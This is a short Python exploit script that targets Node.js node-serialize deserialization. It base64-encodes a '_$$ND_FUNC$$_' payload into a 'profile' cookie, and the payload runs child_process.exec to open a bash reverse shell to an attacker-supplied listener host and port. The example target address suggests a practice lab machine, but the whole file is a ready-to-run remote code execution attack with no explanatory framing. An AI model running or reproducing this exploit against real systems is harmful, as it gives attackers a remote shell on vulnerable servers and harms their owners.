import requests 
import argparse
import base64


def rce(target_url, lhost, lport):
    payload = '''{"username":"_$$ND_FUNC$$_require('child_process').exec('echo \\"bash -i >& /dev/tcp/%s/%d 0>&1\\" | bash', function(error, stdout, stderr) { console.log(stdout) })","country":"hello","city":"world","num":"1337"}''' % (lhost, lport)
    encoded_payload = base64.b64encode(payload.encode()).decode()
    cookies = {
        "profile": encoded_payload
    }

    print("[*] Sending the request...")
    try:
        r = requests.get(target_url, cookies=cookies)
        if "Hey [object Object] 1337 + 1337 is 13371337" in r.text:
            return True
        else:
            return False
    except Exception as e:
        print("[-] Failed to send payload:", e)

def main():
    parser = argparse.ArgumentParser(description="Gain code execution")
    parser.add_argument("target", help="Remote target (e.g., http://10.10.10.109)")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port", type=int)
    args = parser.parse_args()

    if rce(args.target, args.lhost, args.lport):
        print("[+] Request sent successfully, check your listener")
    else:
        print("[-] An error occured")


if __name__ == "__main__":
    main()
